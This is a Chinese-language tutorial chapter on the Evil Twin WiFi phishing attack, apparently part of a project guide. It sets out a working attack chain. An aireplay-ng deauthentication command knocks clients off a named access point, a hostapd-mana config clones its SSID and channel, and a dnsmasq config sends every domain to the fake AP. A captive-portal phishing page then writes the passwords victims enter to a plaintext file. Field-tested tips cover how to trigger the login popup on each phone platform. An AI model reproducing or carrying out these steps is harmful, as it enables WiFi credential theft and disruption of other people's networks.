# 第 4 章 Evil Twin 钓鱼攻击原理

> 本章拆解"Evil Twin"（邪恶双子星）攻击的每一步原理。攻击者伪造一个与真实 WiFi **同名**的假 AP，诱导受害者连接后，通过钓鱼页骗取密码。

## 4.1 为什么"同名"就够骗人？

手机/电脑连接 WiFi 靠 **SSID（名字）** 识别。多数用户看到"熟悉的 WiFi 名字"就会连接，不会去核对 AP 的 MAC 地址。攻击者用**开放模式**（不设密码）广播同名 SSID：

- 真实 CMCC-gf7e 需要密码 → 手机上显示 🔒
- 假 CMCC-gf7e 无需密码 → 手机上显示 ⚠️/无锁

受害者在"信号更好/不用输密码"的诱惑下连接假 AP，攻击得手。

## 4.2 攻击四步曲

### 第 1 步：Deauth 踢人（让受害者掉线）

```
aireplay-ng -0 5 -a C8:75:F4:40:D6:8A wlxYOUR_IFACE
#          ^^  ^ ^^  ^───────────────^   ^^^^^^^^^^^^
#          |   | |   └─ 目标 AP 的 BSSID  └─ 网卡接口
#          |   | └─ 发送 5 组
#          |   └─ deauth 模式
#          └─ 广播（踢所有客户端）
```

原理：802.11 管理帧 **Deauthentication** 不加密、不需要认证即可伪造。向 AP 的频道广播 deauth，所有连接该 AP 的设备立刻掉线。受害者手机会**自动重连**真实 AP（产生握手，见第 3 章），同时会看到假 AP。

### 第 2 步：伪造假 AP（hostapd-mana 开放模式）

```
hostapd-mana evil_auto.conf
```

配置核心：

```
interface=wlxYOUR_IFACE
ssid=CMCC-gf7e        # 与真实 AP 同名！
hw_mode=g
channel=6             # 与真实 AP 同信道
mana_wpaout=mana.hccapx   # open 模式收明文
```

**不设置密码** → 任何设备都能连入（这就是"开放模式假 AP"）。

> ⚠️ 实测：**启动前必须先给网卡配置 IP** `10.0.0.1/24`，否则 dnsmasq 报 `DHCP packet received on wlx... which has no address`。

### 第 3 步：DNS 劫持（dnsmasq）

```
dnsmasq -C dnsmasq_auto.conf
```

配置核心：

```
dhcp-range=10.0.0.10,10.0.0.100,12h   # 给受害者发 IP
dhcp-option=3,10.0.0.1                  # 网关 = 假 AP
dhcp-option=6,10.0.0.1                  # DNS = 假 AP
address=/#/10.0.0.1                     # ★ 劫持一切域名解析到假 AP
```

受害者连上假 AP 后，无论访问什么网站，DNS 查询都被回答成 `10.0.0.1`（假 AP 自己）。

### 第 4 步：Captive Portal 钓鱼页（portal.py）

假 AP 的 80 端口跑着一个"WiFi 网络认证"页面：

- 受害者打开任意网页 → DNS 被劫持 → 请求到 10.0.0.1:80 → 显示钓鱼页
- 手机系统的 **Captive Portal 检测**（访问 `generate_204` / `hotspot-detect` 等）收到 302 → 自动弹出"此网络需要登录" → 打开钓鱼页
- 受害者输入密码 → POST 到 `/submit` → 密码明文写入 `passwords.txt` + 回调控制台验证

## 4.3 自动跳转原理（实测细节）

系统自动弹出认证页依赖 **302 重定向**。钓鱼页必须对下列检测路径返回 302 到首页：

```
/generate_204        (Android)
/gen_204             (Android)
/hotspot-detect.html (Apple)
/ncsi.txt            (Windows)
/success.txt         (Android 部分版本)
```

> ⚠️ 实测：iOS 会全屏自动弹出认证页；**部分安卓机型只弹下拉通知**（"此网络需要登录"），需要用户点一下才打开浏览器——这是系统限制，钓鱼页无法强制打开浏览器。

## 4.4 为什么本项目不用"WPA 中间人"模式？

部分 hostapd-mana 变体支持 `mana_wpa`（假 AP 也要密码，受害者输密码时直接捕获明文）。但本项目实测的二进制只支持 `mana_wpaout`，所以采用**开放模式 + 钓鱼页**方案：

| 方案 | 优点 | 缺点 |
|---|---|---|
| 开放模式 + 钓鱼页（本项目） | 兼容所有 mana 变体，稳定 | 需要受害者主动输密码 |
| mana_wpa 中间人 | 受害者输密码时直接抓明文 | 依赖变体特性，部分编译版本没有 |

原理讲完 → 进入 [第 5 章：自动化系统使用](05-自动化系统部署与使用.md)。
